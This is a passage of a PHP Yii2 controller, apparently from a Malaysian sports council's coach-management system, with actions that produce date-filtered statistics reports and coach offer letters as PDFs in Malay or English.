            'PRESTASI_ATLET' => $prestasi_atlet,
        );
        
        GeneralFunction::generateReport('/spsb/MSN/LaporanJurulatihWajaran', $format, $controls, 'laporan_jurulatih_wajaran');
    }
    
    public function actionLaporanStatistikJurulatihMengikutKursus()
    {
        if (Yii::$app->user->isGuest) {
            return $this->redirect(array(GeneralVariable::loginPagePath));
        }
        
        $model = new MsnLaporan();
        $model->format = 'html';

        if ($model->load(Yii::$app->request->post())) {
            
            if($model->format == "html") {
                $report_url = BaseUrl::to(['generate-laporan-statistik-jurulatih-mengikut-kursus'
                    , 'tarikh_hingga' => $model->tarikh_hingga
                    , 'tarikh_dari' => $model->tarikh_dari
                    , 'format' => $model->format
                ], true);
                echo "<script type=\"text/javascript\" language=\"Javascript\">window.open('".$report_url."');</script>";
            } else {
                return $this->redirect(['generate-laporan-statistik-jurulatih-mengikut-kursus'
                    , 'tarikh_dari' => $model->tarikh_dari
                    , 'tarikh_hingga' => $model->tarikh_hingga
                    , 'format' => $model->format
                ]);
            }
        } 

        return $this->render('laporan_statistik_jurulatih_mengikut_kursus', [
            'model' => $model,
            'readonly' => false,
        ]);
    }
    
    public function actionGenerateLaporanStatistikJurulatihMengikutKursus($tarikh_dari, $tarikh_hingga, $format)
    {
        if($tarikh_dari == "") $tarikh_dari = array();
        else $tarikh_dari = array($tarikh_dari);
        
        if($tarikh_hingga == "") $tarikh_hingga = array();
        else $tarikh_hingga = array($tarikh_hingga);
        
        $controls = array(
            'FROM_DATE' => $tarikh_dari,
            'TO_DATE' => $tarikh_hingga,
        );
        
        GeneralFunction::generateReport('/spsb/MSN/LaporanStatistikJurulatihMengikutKursus', $format, $controls, 'laporan_statistik_jurulatih_mengikut_kursus');
    }
    
    
    public function actionSuratTawaranJurulatih($id)
    {
        if (Yii::$app->user->isGuest) {
            return $this->redirect(array(GeneralVariable::loginPagePath));
        }    
        
        $model = new MsnSuratTawaranJurulatih();
        $model->jurulatih_id = $id;
        $model->format = 'pdf';

        if ($model->load(Yii::$app->request->post())) {
            $parentModel = $this->findModel($id);
            
            $ref = RefBahasaLaporan::findOne(['id' => $model->bahasa]);
            $model->bahasa = $ref['desc'];
            
            if (stripos($model->bahasa, 'bahasa') !== false) {
                $model->bahasa = 'bm';
                $template = 'generate_surat_tawaran_bm';
            } else {
                $model->bahasa = 'bi';
                $template = 'generate_surat_tawaran';
            }
            
            $pdf = new \mPDF('utf-8', 'A4');

            $pdf->title = 'Surat Tawaran Jurulatih';
            $stylesheet = file_get_contents('css/report.css');

            $pdf->WriteHTML($stylesheet,1);
            
            $pdf->WriteHTML($this->renderpartial($template, [
                 'parentModel'  => $parentModel,
                 'model' => $model,
            ]));

            $pdf->Output('Surat_Tawaran_Jurulatih_'.$model->bahasa.'_'.$model->jurulatih_id.'.pdf', 'I');
        }
        
        return $this->render('surat_tawaran_jurulatih', [
            'model' => $model,
        ]);
    }
    
    public function actionJurulatihSambunganOversea($id)
    {
        if (Yii::$app->user->isGuest) {
            return $this->redirect(array(GeneralVariable::loginPagePath));
        }    
        
        $model = new MsnSuratTawaranJurulatih();
        $model->jurulatih_id = $id;
        $model->format = 'pdf';

        if ($model->load(Yii::$app->request->post())) {
            $parentModel = $this->findModel($id);
            
            $ref = RefBahasaLaporan::findOne(['id' => $model->bahasa]);
            $model->bahasa = $ref['desc'];
            
            if (stripos($model->bahasa, 'bahasa') !== false) {
                $model->bahasa = 'bm';
                $template = 'generate_jurulatih_sambungan_bm';
            } else {
                $model->bahasa = 'bi';
                $template = 'generate_jurulatih_sambungan_oversea';
            }
            
            $pdf = new \mPDF('utf-8', 'A4');

            $pdf->title = GeneralLabel::surat_setuju_terima.' ('.GeneralLabel::sambungan.')';;
            $stylesheet = file_get_contents('css/report.css');

            $pdf->WriteHTML($stylesheet,1);
            
            $pdf->WriteHTML($this->renderpartial($template, [
                 'parentModel'  => $parentModel,
                 'model' => $model,
            ]));

            $pdf->Output('Jurulatih_Sambungan_'.$model->bahasa.'_'.$model->jurulatih_id.'.pdf', 'I');
        }
        
        return $this->render('jurulatih_sambungan_oversea', [
            'model' => $model,
        ]);
    }
    
    public function actionJurulatihBaruOversea($id)
    {
        if (Yii::$app->user->isGuest) {
            return $this->redirect(array(GeneralVariable::loginPagePath));
        }    
        
        $model = new MsnSuratTawaranJurulatih();
        $model->jurulatih_id = $id;
        $model->format = 'pdf';

        if ($model->load(Yii::$app->request->post())) {
            $parentModel = $this->findModel($id);
            
            $ref = RefBahasaLaporan::findOne(['id' => $model->bahasa]);
            $model->bahasa = $ref['desc'];
            
            if (stripos($model->bahasa, 'bahasa') !== false) {
                $model->bahasa = 'bm';
                $template = 'generate_jurulatih_baru_bm';
            } else {
                $model->bahasa = 'bi';
                $template = 'generate_jurulatih_baru_oversea';
            }
            
            $pdf = new \mPDF('utf-8', 'A4');

            $pdf->title = GeneralLabel::surat_setuju_terima.' ('.GeneralLabel::lantikan_baru.')';
            $stylesheet = file_get_contents('css/report.css');

            $pdf->WriteHTML($stylesheet,1);
            
            $pdf->WriteHTML($this->renderpartial($template, [
                 'parentModel'  => $parentModel,
                 'model' => $model,
            ]));

            $pdf->Output('Jurulatih_Baru_'.$model->bahasa.'_'.$model->jurulatih_id.'.pdf', 'I');
        }
        
        return $this->render('jurulatih_baru_oversea', [
            'model' => $model,
        ]);
    }
    
    public function actionLaporanCawanganPengurusanJurulatih()
    {
        if (Yii::$app->user->isGuest) {
            return $this->redirect(array(GeneralVariable::loginPagePath));
        } 

        $model = new MsnLaporan();
        $model->format = 'pdf';

        if ($model->load(Yii::$app->request->post())) {
            
            $pdf = new \mPDF('utf-8', 'A4-L');

            $pdf->title = 'Laporan Cawangan Pengurusan Jurulatih';
            $stylesheet = file_get_contents('css/report.css');

            $pdf->WriteHTML($stylesheet,1);
            
            $pdf->WriteHTML($this->renderpartial('generate_laporan_cawangan_pengurusan_jurulatih', [
                 'model' => $model,
            ]));

            $pdf->Output('Laporan_Cawangan_Pengurusan_Jurulatih.pdf', 'I');
            
            // return $this->renderpartial('generate_laporan_cawangan_pengurusan_jurulatih', [
                // 'model' => $model,
                // 'readonly' => false,
            // ]);
            
        } 

        return $this->render('laporan_cawangan_pengurusan_jurulatih', [
            'model' => $model,
            'readonly' => false,
        ]);
        
    }
    
    public function actionLaporanPermohonanJawatankuasaBantuan()
    {
        if (Yii::$app->user->isGuest) {
            return $this->redirect(array(GeneralVariable::loginPagePath));
        } 

        $model = new MsnLaporan();
        $model->format = 'pdf';

        if ($model->load(Yii::$app->request->post())) {
            
            $pdf = new \mPDF('utf-8', 'A4-L');

            $pdf->title = 'Laporan Permohonan Jawatankuasa Bantuan';
            $stylesheet = file_get_contents('css/report.css');

            $pdf->WriteHTML($stylesheet,1);
            
            $pdf->WriteHTML($this->renderpartial('generate_laporan_permohonan_jawatankuasa_bantuan', [
                 'model' => $model,
            ]));

            $pdf->Output('Laporan_Permohonan_Jawatankuasa_Bantuan.pdf', 'I');
        } 

        return $this->render('laporan_permohonan_jawatankuasa_bantuan', [
            'model' => $model,
            'readonly' => false,
        ]);
        
    }

}
